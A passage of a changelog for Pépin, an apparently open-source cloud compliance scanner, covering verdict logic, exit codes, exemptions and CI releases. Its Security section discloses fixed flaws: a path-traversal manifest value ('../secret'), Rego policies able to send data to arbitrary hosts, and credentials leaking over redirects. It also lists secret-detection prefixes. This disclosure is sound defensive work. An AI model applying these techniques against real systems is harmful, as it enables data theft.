  documentation says a complete scan needs the account owner's keys** (issue #168).
  Measured on 2026-09-09 against a real `eu-west-2` tenant, with an EIM user carrying
  nothing but the read-only policy Outscale publishes (`api:Read*` on `*`): every OAPI
  unit came back complete, with an inventory identical to the account owner's — and
  **OOS and OKS both refused that identity**. OOS answers `InvalidAccessKeyId — The AWS
  access key Id you provided does not exist in our records`, meaning it does not know
  EIM keys at all; OKS answers `Forbidden: User type not allowed`, refusing the identity
  by its type. Neither is a missing grant, so no EIM policy lifts them. Those two units
  carried an **empty** grant in the descriptor, and the capability report only prints
  "required grant" when the descriptor declares one: the operator read the raw S3 error
  and went to check a perfectly valid key. Both grants are now declared, so the
  capability report and every `not-evaluated` reason name them. The permissions table
  distinguishes a **documented** line from a **measured** one and dates the latter
  (`mesure:` in the descriptor); the provider page states how to live with owner keys —
  a dedicated key with an expiry, out of CI, and a dated exemption on
  `iam_no_root_access_key` rather than silence. No credential enters CI: the measurement
  is a maintainer gesture, run locally and recorded (ADR-0012).

- **The qualification gate said GO while a known false green stood.** It compared a run
  to `expected.yaml` and concluded GO when they matched — a good **non-regression
  contract**, but presented as a **release quality gate**. A pinned defect reproduces
  identically, the comparison finds no difference, and the gate said GO: it verified that
  the product lies the same way it did yesterday. The two questions are now answered
  separately, side by side in the report. A known defect declares its **class** and
  whether it blocks a release: a `false_green` **always** blocks and cannot be waived — it
  is the promise the product is built on — a `false_positive` blocks by default and can be
  waived explicitly, and a `coverage_gap` does not block, because a justified
  `not-evaluated` is a named limit, which is exactly what the product asks of itself.
  A bare string, or a class nobody declared, blocks: a pin that does not say what it is
  must not act as a pass.
- **Terraform plans: a declared reference now closes the correlation that never worked.**
  A plan cannot know the id of a resource it is about to create — that attribute is not
  resolved, it is **absent**. Measured on a reference tenant built from third-party HCL:
  `vm_id`, `public_ip` and `security_group_ids` were absent on 5/5 VMs, and
  `security_group_id` on 14/14 rules — everything the rules join on. The verdict stayed
  honest (`not-evaluated`, never a `pass`), but no real plan correlated anything; only
  hand-written test plans did, where the id is a literal. The plan carries the relation
  elsewhere: `configuration` keeps the reference the operator wrote, and that reference
  is an observation, not an estimate (ADR-0022). It is followed across module
  boundaries, because inside a module the argument reads `var.x`. An **ambiguous**
  reference — a declaration multiplied by `count` — resolves to nothing: joining VM #0
  to security group #1 would be a deviation posted on a resource that does not carry it.
- One verdict moves on the reference corpus: `compute_instance_has_security_group` from
  `not-evaluated` to `pass` on outscale/terraform.
- **A finding's subject can change on the Terraform source.** A resolved address becomes
  an identity, so a descriptor whose `id:` reads a now-filled field names the resource it
  points at: on a Scaleway plan, a bucket ACL's subject is the **bucket it configures**
  rather than the ACL resource. That is the subject one looks for, and it matches the
  live source — but **a derogation written against the old subject stops matching**.
- Reference tenant plans now carry the `references` of their `configuration`, and never
  its `constant_value` — the latter is where a hard-coded secret lives. A guard holds it
  on the committed text.
- **The two findings a freshly created network produced now say which of them the
  operator did.** On a brand-new Outscale Net, a live scan reported a `high` on the
  default security group — "carries an inbound rule" — and the operator went looking for
  a rule they had written. The rule found is the one the provider creates with the
  network: its only accepted source is the group itself. The finding stands (two
  resources started without an explicit SG land in it and talk freely, which is what
  CLD-NET-4 refuses), but it now names the shape it found, and carries
  `confidence: contextual` rather than `confirmed`. The distinction is **observed**, not
  deduced from a missing CIDR: an inbound rule accepts a source by CIDR **or** by group,
  and the group source is now collected (`peer_security_group_ids`). Where the field is
  absent the rule falls back to the general wording and to `confirmed` — not knowing must
  not take a deviation out of a CI gate.
- **Unrestricted egress is `contextual`, not `confirmed`.** The label was inherited from
  the shared constructor, whose justification is about ingress: there is no legitimate
  reason to open SSH to the whole internet. That argument does not transfer to the way
  out. An open egress is a real exfiltration path, but defensible architectures leave it
  open and filter downstream — gateway, proxy, perimeter firewall — on a plane the scan
  does not see. The finding keeps its code, its `medium` severity and its `security`
  category; it leaves `--gate security` without leaving the report. **Default behaviour
  is unchanged**: `--gate all` still exits `1`.
- Exposure messages now pick their preposition from the rule's direction. An outbound
  rule accepts nothing "from" the internet, and a reader who corrects what the sentence
  describes was looking in the wrong place.
- **Sovereignty is now measured on the resources that host data, and only those.** The
  EU-location control asserted compliance from a *neighbour*: one resource carrying a
  region opened a `pass` for every other, including types the rule never examines — an
  `iam_user` in `fr-par` certified a VM whose own region had never been collected. A
  region now counts as observed only when every resource of that type carries one.
  **Verdict change on an unchanged tenant**: a tenant holding no located resource (only
  networks, subnets, peerings) moves from `pass` to `not-evaluated`, and one whose
  located resources are partly unlocated does too.
- **A broken join no longer reads as a deviation.** Deciding data is declared per
  resource type, so a control that correlates two types degrades when the *link* is
  missing rather than concluding without it. `volume_id` uncollected on snapshots made
  every volume look unbacked — a mass false positive, `high` severity, caused by a
  collection gap. **Verdict change on an unchanged tenant**: those become
  `not-evaluated` naming the missing field. A volume genuinely without a snapshot, and
  a tenant with no snapshot at all, still fail.
- **A deviation inferred from an absence nobody sought is withdrawn.** Some rules
  conclude from an absence and are right to — on Scaleway a nil `ExpiresAt` *is* "no
  expiry". But an unmapped field is absent too, and the two were indistinguishable, so
  `iam_accesskey_expiration_set` raised a `critical` either way. The assessment now
  reads provenance, which records what was **sought**, and withdraws the deviation when
  the field was never asked for ([ADR-0017](docs/adr/0017-provenance-atteste-une-recherche.md)).
  **Verdict change on an unchanged tenant**, one way only: an assertion is withdrawn,
  never added. An inventory carrying no provenance — a third-party export — is
  untouched.
- **The veracity debt drops from 445 to 395 verdicts left to prove**, and fully proven
  paths go from 5 to 23 out of 178. The reference tenants and the hand-written
  scenarios feed **one** ledger: two coverage figures would diverge, and the one that
  diverges is the one people read. A tenant verdict counts only when it is
  *substantive* — `fail`, `pass` and `not-applicable` always, `not-evaluated` only when
  the tenant actually carries a resource of the targeted type. Without that filter the
  same six tenants would have paid 97 obligations instead of 50, half of them with
  absences.
- **A tenant plan now keeps only the attributes a mapping actually reads.** The
  reducer cut at the section level and kept every attribute of every resource, so a
  `helm_release` carried its whole Helm values blob, a `kubectl_manifest` its
  `yaml_body`, a `kubernetes_secret` its contents — none of which any common rule
  reads. Reduction is now an allowlist derived from the descriptors, down to the
  field, and `TestNoReferenceTenantPlanCarriesAnAttributeNobodyReads` refuses the
  rest. **No verdict moves**: `internal/tfmap` only ever projected the mapped fields.
  The corpus drops from 54 KiB to 25 KiB.

## [0.3.0] - 2026-08-21

### Added

- **A recorded collection session, and the gate that replays it.** A provider
  descriptor declares endpoints; nothing proved the collector *emits* them, which is
  the exact shape of the inline-EIM incident (right rule, data that never arrived, no
  Rego test able to see it). `mise run trace` now records a real `--live` collection
  through an intercepting proxy, against a **local emulator** and with **no cloud
  credential**, and the recording is committed to
  `internal/genprovider/testdata/transcripts/`. Two gates replay it on every build:
  `TestTheRecordedCollectionStillHappens` (fewer calls than the recording saw means a
  datum stopped arriving; more means an endpoint declared but never measured) and
  `TestEveryDeclaredEndpointIsObservedOrDeclaredUnobserved` (the `non_observes` ledger
  is exact in both directions). The replay serves the **recorded** responses, never
  responses derived from the spec under test: a harness answering "what the spec
  expects" would measure its own copy of the spec and stay green on a wrong `items:`.
  Measured on the first run: no declared endpoint stays silent, except three Outscale
  child joins and one Exoscale child join whose parent list is not served by the
  emulator or came back empty — each now written down with its reason. New guide:
  [Tracing real API calls](docs/guides/tracing-api-calls.md). No line of Pépin
  changed, so no collection endpoint became overridable and no exfiltration surface
  was created.

- **A veracity contract, and a debt counter rather than a green matrix.** For each
  control × provider × source path, `internal/veracity` derives the verdicts that
  path can actually reach — three where it can conclude, one where it cannot lift
  the `pass` lock, one where the provider contract declares it not applicable — and
  compares them to committed scenarios that run **against the binary**, over the
  whole chain: canned API responses served to the descriptor's real collection spec,
  or a minimal Terraform plan passed to its real mapper. What is not proven is
  recorded in `internal/veracity/testdata/debt.txt`, a gate in both directions: an
  unproven obligation missing from the ledger fails the build, so **a control added
  without its scenarios cannot land**, and a line no longer owed fails it too. The
  counts are published in `docs/known-limitations.md`. Today: 178 paths, 5 fully
  proven, 458 obligations, 445 outstanding. A matrix of seven hundred
  template-generated cases would be green and would prove nothing.

- **A degradation suite with one guarantee: never a `pass`.** A refused endpoint, a
  refused child join, a partial response, an unavailable service, an unreadable
  response, a Terraform attribute still unknown at plan time — each produced for
  real against a live server or a real plan, and checked on **every** control that
  reads the affected type rather than on a chosen witness.

- **A Terraform finding carries its origin: file, line, module.** `--format json`
  gains `labels.tf_file`, `labels.tf_line` and `labels.tf_module`; the SARIF result
  gains a `physicalLocation` with a `region`, which is what makes a forge annotate the
  guilty `resource` block instead of the plan file. The module is read off the resource
  address; the file and the line are **measured** in the `.tf` sources beside the plan,
  because `terraform show -json` carries neither — verified in Terraform's own source,
  where a resource's configuration representation holds `address`, `type`, `name` and
  `expressions` and nothing about the document. When the sources are absent, the module
  is remote, or the same block header appears twice, the origin is simply absent: a
  wrong line sends someone to fix the wrong place, and it is believed. On a live
  collection the notion does not exist and no label is set.

- **Minimum permissions are declared in the descriptor, not only in prose.** Each
  provider descriptor now carries a `permissions:` block, one entry per collection
  unit: the grant in the provider's native vocabulary, the official source that
  states it, and whether it is **confirmed** or still **to verify**. The provider
  pages render that block, so the table a reader follows and the grant the scan names
  in a `not-evaluated` reason cannot diverge. Four gates refuse a silent omission: a
  collection unit with no declared grant, an orphan entry, a missing state or source,
  and an unverified grant with no written reservation. Nothing here is confirmed by a
  scan run with a deliberately reduced role — this repository holds no cloud
  credentials — and every page says so.

- **Collection completeness is recorded, and it moves the verdict.** Every collector
  — the declarative engine, the object-storage collector, the inline EIM policy chain
  and the managed-Kubernetes one — now records, unit by unit, whether it read
  everything the API had to return. A refused endpoint no longer stops the scan and no
  longer disappears into a warning: the inventory carries a `collection` block
  (`attempted`, `complete`, a stable `error` class, the provider's own `detail`), it is
  sealed in the evidence bundle, and it is published in `--format json`. **Every
  control that reads a resource type fed by an incomplete unit becomes
  `not-evaluated`** with that unit named as its reason — the assessment decides, never
  a rule — and the scan returns **`3`, never `0`**. The transition is strictly
  directional: a `pass` is withdrawn, a `fail` is kept (an observed deviation stays
  observed), a `not-applicable` is kept (it comes from the contract, not from the
  collection). *A verdict can now move on an unchanged tenant: a scan whose credentials
  cannot read part of the scope used to return `0`, and returns `3` from now on.*

- **A capability report, printed before any verdict.** A live scan announces what it
  could and could not observe, unit by unit, with the class of each failure and the
  number of controls it costs — the count coming from the same function that degrades
  the assessment, so the report cannot promise what the report does not hold. Outside
  live scans it appears only when there is something to say. Resource types a Terraform
  plan carries and no spec projects are listed too: they are not incompleteness — no
  control reads them, so no verdict depends on them, and they do not gate — but they
  are no longer silent.

- **`exempted`: a fifth, first-class assessment status, and dated exemptions.**
  `scan --exceptions <file.yaml>` reads a versioned exemption policy — `control`,
  `justification`, `expires_at`, `owner`, `approved_by`, all five mandatory and all
  validated at load time. A `fail` covered by a valid entry becomes `exempted`, never
  `pass`: the finding stays in `--format json`, in the SARIF and in the severity
  counts, `summary.conforme` stays false, and the verdict reads `NON-COMPLIANT under
  waiver`. **A new exit code, `4`**, means "every remaining critical/high deviation is
  covered by a dated, attributed exemption" — non-zero, so nothing passes in silence,
  and distinct, so a pipeline that accepts it has to write the number down. An expired
  exemption stops applying and says so; one naming a control or subject that does not
  exist is reported as an orphan; both fail a `--strict` gate. The bundle seals
  `exemptions.json`, so the dossier digest depends on what it set aside, and
  `verify --re-derive` replays the sealed policy at the sealed instant.
  *A status and an exit code are both surfaces a pipeline must know how to read.*

- **Every attribute of the normalized inventory carries its provenance.** Beside
  `attributes`, a parallel `provenance` index says, for each attribute, where the
  value came from — `api` with the request **actually served**, `terraform-plan` with
  the plan resource type, or `derived` for a descriptor literal or a locally computed
  value — and whether the source really carried the field. It is a parallel index and
  not a wrapper around each value: the 59 Rego rules read `attributes.<name>`
  unchanged, so no verdict can move (measured on nine fixtures × two formats × two
  languages: identical findings, statuses and exit codes). `--format assessment` now
  exposes, for every control with a deciding attribute, that attribute and its
  attestation in `evidence.attribute` / `evidence.source`. This makes visible, without
  changing it, that two controls cross their attribute gate thanks to a descriptor
  constant rather than a measurement.

- **The normalized inventory is a versioned internal contract.**
  `pepin-inventory/v1`, frozen in `cmd/testdata/frozen/inventory.json` with its
  envelope, its resource shape and the full vocabulary of resource types and common
  attributes derived from the descriptors and collectors. The version travels with
  every evidence bundle (`manifest.inventory_schema`), and a new reference page states
  what is guaranteed and what is not. **Bundle format `/v2`** (manifest carries the
  inventory schema and the exemption summary), **CLI surface v3** (`--exceptions`,
  exit code 4).


- **Wave 3 of the documentation: the control catalogue is generated, and the
  project explains itself.** One generated page per control under `docs/controls/`
  (what it concludes, from which source, with which reason when it cannot), a
  remediation guide that shows the same control moving from `fail` to `pass` on the
  repository's own example plans, an architecture page that argues the central choice
  — one common rule set, the source is what changes per cloud — and two contribution
  guides, adding a control and adding a provider, each ending in a checklist usable as
  is. A public `ROADMAP.md` replaces the internal working document that used to sit in
  the product documentation.

- **Exoscale is the first provider with a complete set of deployable remediation
  proofs**: 26 of 26, bringing the repository from 4 to 26 out of 95. Twenty
  self-contained Terraform modules, checked with `terraform init -backend=false` and
  `terraform validate` against the real provider schema, plus two documented notes
  where Terraform cannot express the fix (provider sovereignty, account MFA).
  `TestExoscaleRemediationCoverageStaysComplete` now fails the build when an exoscale
  control lands without its proof; the other providers stay outside that guard until
  they reach 100 %.

- **Wave 2 of the product documentation: ten pages, generated where they can be.**
  A CLI reference built from the frozen surface and from real `--help` runs, the
  exit-code contract shown as six executions with the code each one returned, the
  five output formats with a real document each, plan-versus-live with two
  reproducible divergences, the evidence-bundle lifecycle (seal, verify,
  re-derive, tamper, redact) captured end to end, GitHub Actions and GitLab CI
  integrations whose complete pipelines are injected from `examples/`, and one
  page per sovereign cloud with its API calls and its minimal read-only
  permissions. `TestEveryPublicCLIFlagIsDocumented` now fails when a public flag
  is missing from the CLI reference, in either language.

- The published CI examples pin **v0.2.0** and every action by commit SHA. The
  action of v0.1.0 and v0.1.1 could not install anything (`gh attestation verify`
  without a token), so those tags should not be pinned by anyone.

- **Controls become configurable, and a relaxed setting cannot keep its badge.** Four
  controls now read a policy file — the mandatory tagging profile, the snapshot
  freshness window and accepted states, the secret-detection threshold. Every setting
  is a handle that can manufacture green, so each normative mapping in the reference
  carries the **constraints under which it holds** (`config_requise`, with four
  interpretable senses: `au_plus_le_defaut`, `superset_du_defaut`,
  `sous_ensemble_du_defaut`, `au_moins_aussi_strict_que_le_defaut`). A configuration that falls outside a constraint makes the
  control **lose its `references`** in the assessment — it stops claiming CIS,
  ISO or SecNumCloud — and the relaxation appears in five places at once: the terminal
  (`RELAXED CONFIGURATION`), the assessment labels and evidence, `--format json`
  (`config.relaxations`), the verdict banner, and the sealed bundle (`config.json`
  plus a `config` entry in the manifest, both covered by `checksums.txt`). Tightening a
  setting is not a relaxation and is reported nowhere. `mise run validate` refuses a
  constraint naming a setting the policy engine cannot evaluate. See
  `docs/guides/control-configuration.md`.

- **One policy file: `scan --policy`.** It carries `controls:` (the settings) and
  `exceptions:` (the exemptions, unchanged format). `--exceptions` remains as the
  historic name of the same file and reads the same schema, so an existing invocation
  and an existing file keep working; the two flags are **mutually exclusive**, because
  two policy files are two files that will drift. CLI surface v4.

- **Secret detection carries a confidence level.** Every finding of
  `compute_instance_no_secrets_in_user_data` publishes `labels.confidence`: `high` for a
  PEM private-key block, `medium` for a recognized prefix in the expected format
  (`ghp_`, `AKIA`, `SCW`, `EXO`, `glpat-`, JWT), `low` for a generic heuristic
  (`password=…`, `api_key=…`). The default reporting threshold is `low` — everything is
  reported, exactly as before. The detected value still never appears, at any level, and
  that property is now tested at all three levels, on the message and the remediation,
  in both languages.

- **The evaluated inventory carries its configuration.** The envelope gains `config`,
  the effective control configuration, next to `evaluated_at` — so a sealed bundle's
  `input.json` replays under the settings of its own day, and `verify --re-derive` stays
  faithful without being handed the policy file. `--format json` publishes
  `config.policy_digest` and `config.effective` on **every** scan, default included: a
  reader must be able to check that a scan ran under the expected settings, not merely
  observe that it said nothing. Bundle format v3.

### Changed

- **`network_documented` now checks what it announces.** The rule promised owner, project
  and environment, and evaluated `count(tags) > 0`: a single `foo=bar` was enough to
  declare a network documented — a compliance asserted without being measured. It now
  requires the tags that actually document (default `Owner, Project, Env`, configurable),
  and it stays silent when the `tags` attribute was not collected, where it used to report
  a deviation. The **code is unchanged**: it travels in SARIF `ruleId`s, archived
  assessments and exemption files, where a rename would turn a valid exemption into an
  orphan overnight and bring back the deviation it covered. Title and description are
  rewritten in both languages.

- **The mandatory tagging policy is configurable, and the comparison is
  convention-agnostic.** `governance_resource_required_tags` no longer demands four frozen
  literals. The comparison ignores case and separators (`cost-center` = `CostCenter`), and
  aliases widen each logical name (`team` for `Owner`, `environment` for `Env`), so an
  organisation writing `cost-center, application, environment, team` is no longer reported
  as ungoverned. The targeted resource types are explicit and justified, and four billable
  types join the scope — `blockstorage_snapshot`, `compute_image`, `managed_database`,
  `kubernetes_cluster` — which closes a false-negative on paid services that were outside
  it. The shipped profile is documented as a **recommendation, not a standard**.

- **The snapshot freshness control says what it measures, and what it does not prove.**
  `blockstorage_volume_snapshots_exist` now checks the snapshot's **native state** as well
  as its date: a snapshot in `error`, `pending` or `creating` no longer counts as a backup.
  The window is configurable (7 days by default). The title becomes "No recent, completed
  snapshot", and the description states plainly what the control does not prove —
  restorability, application completeness, retention, the existence of a backup policy.
  The code is unchanged, for the same reason as above. Anchored on Outscale
  `Snapshot.State` and Exoscale `block-storage-snapshot.state`, both projected by the
  collectors from this version on. The normalized inventory therefore gains an attribute,
  which is a contract change: inventory schema v4, whose note also records the `config`
  envelope key added above.

- **`--strict` also refuses a dropped normative mapping.** It already refused zero
  coverage, remaining medium/low deviations and a stale exemptions file; it now returns
  `3` when a relaxed setting cost a control its mapping. No new exit code: incompleteness
  and relaxation say the same thing — do not read this scan as a green light — and both
  already sit where `3` sits.

## [0.2.0] - 2026-08-19

### Added

- **Pépin is bilingual, and detects the language.** Reports, verdict, help,
  errors and the parsable formats (`json`, `sarif`, `oscal`, `assessment`) come
  out in French or in English. Resolution order:
  `--lang=fr|en` → `PEPIN_LANG` → `LC_ALL` → `LANG` → fallback `en`; the first
  non-empty source decides, and an unknown locale falls back to English without
  an error. Until now the skeleton was English and the content French, so a
  reader got a report in two languages within one sentence.
  French remains the reference language of the normative content: the reference
  and the rules are written in French first, and where a legal reading is at
  stake it is the French wording of a control that governs.

- **The project has a mark.** `docs/assets/brand/` holds the icon and the
  lockups in SVG and PNG, light, dark and monochrome, with the generators that
  produce them (`scripts/generer-marque.py`, `scripts/generer-png-marque.py`)
  and the usage rules in `docs/brand.md`. Both READMEs open on it.

### Changed

- **Inventory schema `pepin-inventory/v3`.** A resource gains `source` (`file`, `line`,
  `module`), present only where it could be measured. Pure addition.

- **Exit code `3` widens from "nothing measured" to "the scan does not establish
  compliance".** It now also fires when the collection could not read part of the
  intended scope. Deliberately no fifth code: an incompleteness code could never take
  precedence over `1` — hiding a real critical deviation because the rest was missing
  would be the false green this wave exists to prevent — so it would only ever fire
  where `3` already fires. What distinguishes the situations stays readable in the
  capability report, in each control's reason and in the `collection` key.
  *An exit code is a surface every pipeline parses.*

- **Inventory schema `pepin-inventory/v2`.** The envelope gains `collection`. Pure
  addition — no existing field moves — but a consumer that replays an inventory without
  reading `collection` would conclude more firmly than Pépin did, which is exactly what
  the field exists to prevent. The version travels in `manifest.inventory_schema`.

- **A finding's prose changes with the language, its keys do not.** Codes
  (`CLD-*`), check identifiers, severities, statuses, subjects and exit codes are
  identical in both languages; titles, messages, remediations and evidence are
  translated. A pipeline that diffs report *text* between runs should pin
  `PEPIN_LANG`. A pipeline keyed on codes and statuses is unaffected.
- **A sealed bundle carries the language of the scan that produced it.**
  `verify --re-derive` replays the rules in both languages and accepts either
  match, so verifying a French bundle from an English shell is not reported as a
  falsification. Note that the bundle digest does depend on the language, since
  the assessment's prose is part of what is sealed.
- **CLI surface v1 → v2**: the persistent `--lang` flag is added. Pure addition —
  no verb, no other flag and no exit code moved.


- **`docs/doc-cache-brief.md` moves out of the product documentation.** It was a
  maintainer's memo addressing a machine ("already downloaded on this machine"),
  describing a cache a clone cannot have, linked from nowhere, and carrying six
  absolute paths into a home directory. What it held that was worth keeping
  moves to `references/docs/README.md`, beside the `sources.yaml` it describes --
  including the trap that matters most: the documentation is not the contract.

### Fixed

- **The published action installs again.** The provenance check added in 0.1.0
  called `gh attestation verify` without a token; `gh` refuses to run in a
  workflow without `GH_TOKEN`, so the installer treated every binary as
  unverifiable and refused it -- for every consumer, on both 0.1.0 and 0.1.1.
  The action now supplies `github.token` itself: nobody should have to wire up a
  token to install a binary.

  The gap that let it ship is worth naming. The pull-request job served
  `install.sh` over a loopback with the attestation check skipped, so the public
  path was never exercised until the post-publication job ran -- after the tag
  existed. A job now calls the action against an already-published version on
  every pull request.

## [0.1.1] - 2026-08-19

### Fixed

- **A Scaleway instance whose security group is created by the same plan is no
  longer reported `CRITICAL` "VM without a security group".** At plan time
  `security_group_id` is *unknown after apply*, so it is absent from
  `planned_values`; the `list` transform then fabricated an empty collection,
  which satisfied the rule's capability guard — the guard that exists precisely
  to prevent this. A collection transform now only runs when the source key
  actually exists. Absent means the source does not expose the information;
  present-and-empty is information.

  This changes a verdict on an unchanged tenant: the control moves from `fail`
  to `not-evaluated` on a Terraform plan. On a plan, an instance genuinely
  without a security group is indistinguishable from one whose group is not yet
  known, so Pépin now says so instead of guessing. The live path benefits too,
  where an API omitting a key produced the same fabricated `[]`.

  Found by replaying fifteen third-party Terraform stacks against the binary.

- **The documentation drift gate now compiles what it measures.** It reused a
  `./pepin` already present at the repository root, so a stale binary could
  validate stale pages — it did, reporting "up to date" while the docs still
  advertised the finding above.

### Added

- **Product documentation, generated rather than transcribed.** Six pages in
  English with synchronised French counterparts: a five-minute quickstart that
  needs no cloud account, the assessment model (`pass` / `fail` /
  `not-applicable` / `not-evaluated`), the provider × control coverage matrix,
  known limitations, a commented walkthrough of a real scan, and the exact scope
  and non-goals. Every command output is captured from a real run of the binary,
  the coverage matrix is computed from the reference and the provider
  descriptors, and a CI gate fails when either drifts.

- **Fuzzing over untrusted inputs** — `FuzzParsePlan` and `FuzzInventoryWalk`,
  covering the Terraform plan and inventory export paths. It immediately found a
  resource with an empty type entering the model, now rejected and kept as a
  regression.

### Security

- `SECURITY.md` now links its private reporting channel instead of only
  describing it.

## [0.1.0] - 2026-08-19

### Security

- **Policies loaded at runtime no longer get network access.** `--policy-dir`
  compiled third-party Rego with OPA's default capabilities, `http.send`
  included, so an eight-line rule could POST the evaluated inventory — instance
  user-data, IAM policy documents, bucket policies — to an arbitrary host, or
  reach the runner's internal network from inside the scanner. Fixed upstream in
  `scankit v0.2.2`; a policy calling one of those builtins now fails to compile.
  Policy evaluation also gets a five-minute deadline.
- **Provider credentials no longer survive an HTTP redirect.** Go strips only
  `Authorization`, `Cookie` and `WWW-Authenticate` across domains — not
  `X-Auth-Token` (the Scaleway secret key) nor `AccessKey`/`SecretKey`
  (Outscale). One 302 toward a controlled host handed them over. The collection
  client no longer follows redirects.
- **`pepin verify` no longer reads outside its bundle.** Artifact names came
  from the manifest, supplied by the audited third party, so `../secret` turned
  verification into an existence-and-content oracle. Names must be plain
  basenames.
- **`--seal --redact` no longer ships the tenant's keys.** Redaction covered
  free-form documents only, while `access_key` is a first-class attribute of the
  normalized model and `password`/`certificate` come from managed databases.
- **Toolchain moved to Go 1.26.6**, which resolves five standard-library
  advisories reachable from this code (`net/url`, `crypto/tls`, `encoding/xml`,
  `encoding/asn1`, `net/http`).
- **The published action verifies authenticity, not just integrity.** The binary
  and `checksums.txt` come from the same origin, so whoever can replace release
  assets replaces both. `install.sh` now verifies build provenance via
  `gh attestation verify`.

### Fixed

Every item below can change a verdict on an unchanged tenant.

- **A scan that measured nothing no longer exits `0`.** Expired credentials,
  insufficient rights or a truncated inventory produced the same empty result as
  a clean tenant, and the CI gate went green on a scope never looked at. Exit
  code `3` now says so without requiring `--strict`.
- **Fourteen controls no longer report `pass` without the deciding data.** The
  capability gate gained thirteen entries, and an empty collection no longer
  counts as collected — the IAM collector always sets `statements`, at `[]` when
  a document fails to parse, so four critical/high controls concluded
  "compliant" over zero information.
- **`authenticated-read` and `AuthenticatedUsers` are detected** as public
  exposure: both grant read access to every authenticated user of the platform,
  which is cross-tenant.
- **A bucket made public by an inline `acl`** on `scaleway_object_bucket` is
  collected at last; it previously produced zero findings and a "compliant"
  verdict.
- **Booleans arriving as strings are honoured.** A Terraform plan renders some
  schema attributes as `"true"`/`"false"`, and `== false` is simply false for
  `"false"`; 25 comparisons across 16 rules now go through `truthy()`.
- **An uncatalogued region is reported** instead of silently passing: the
  classification tables are allow-lists, so their silence read as "in the EU".
- **Network normalization**: `-1`, `any` and an empty protocol all mean "every
  protocol", and a scalar where the model expects a list no longer makes the
  rule undefined — an export carrying `"cidrs": "0.0.0.0/0"` went unreported.
- **`CLD-CHF-2` severities aligned** on `high` across its three controls;
  severity drives the CI gate, and the split was unjustified.

### Added

- **The public surface is frozen by tests, not by prose.** The CLI's verbs,
  flags and exit codes, the `--format json` findings document, the assessment
  document and the evidence-bundle layout each have a committed fixture under
  `cmd/testdata/frozen/` — the field tree, never a value. A shape that moves
  without its fixture fails CI; a fixture regenerated without its declared
  version moving fails CI too. The bundle's version travels on the wire as the
  `/vN` suffix of `format` in `manifest.json`; a verifier that meets a version
  it does not know should stop rather than guess.
- **The SCSL index is watched for drift.** `mise run scsl-drift` compares the
  live `framework-scsl` index against a baseline committed in
  `referentiel/scsl-baseline.json` and exits 2 when a CLD requirement was
  added, removed or rewritten upstream without a human retriaging the
  mappings. Note the tooling exit convention (0 ok, 1 error, **2 drift**)
  is deliberately distinct from `pepin scan`'s (where 2 is a technical error).
- **A release is refused before the tag, not regretted after it.**
  `mise run release-check -- vX.Y.Z` replays offline everything that must
  hold: clean tree on `main`, a free tag, tests and referential coherence,
  zero SCSL drift, the exit codes answered by the built binary rather than
  read from a constant, a sealed bundle that verifies, re-derives **and
  refuses itself once tampered with**, the version the Conventional Commits
  imply (`.cz.toml`), and both CHANGELOGs carrying the section the release
  body is read from.
- **A tag builds, attests and signs the release.**
  `.github/workflows/release.yml` builds `linux`/`darwin` × `amd64`/`arm64`
  binaries with the tag stamped in, generates SHA-256 checksums and a
  CycloneDX SBOM, records SLSA build provenance, signs the checksums with
  keyless Cosign, and publishes the GitHub Release with this file's matching
  section as its body.
- **A container image** (`ghcr.io/stephrobert/pepin`, one tag per release, no
  `latest`): the released linux binaries on a distroless base pinned by
  digest — CA roots for `--live`'s TLS, user 65532, no shell. Nothing is
  compiled in the Dockerfile, so the release's checksums, SBOM and provenance
  describe the image's content too; the image carries its own SLSA
  provenance, SBOM attestation and keyless signature, and the release refuses
  an image whose `pepin version` is not the tag or whose exit codes moved
  through `docker run`.
- **A composite GitHub action** (`.github/actions/pepin-scan`) that verifies
  the downloaded binary's SHA-256 against the release's checksum list before
  running it, scans a Terraform plan, an inventory or the live API, and turns
  the exit codes into a gate: `fail-on-nonconformity: 'false'` downgrades a
  non-compliant verdict (1, or 3 under strict) to a warning, and never
  downgrades a technical error (2). Credentials are never action inputs; the
  provider's native variables come from `env:`. CI corrupts one byte of the
  download and requires the refusal (`entrypoints.yml`), and every release
  replays the action against its own published artefacts.
- **A GitLab CI template and CI examples**
  (`examples/gitlab-ci/`, `examples/github-actions/`): same verified
  download, same exit-code contract, report-only via
  `allow_failure: exit_codes: [1, 3]` — never 2. Installation and
  verification for all four entry points are documented in
  `docs/install.md` / `docs/install.fr.md`.
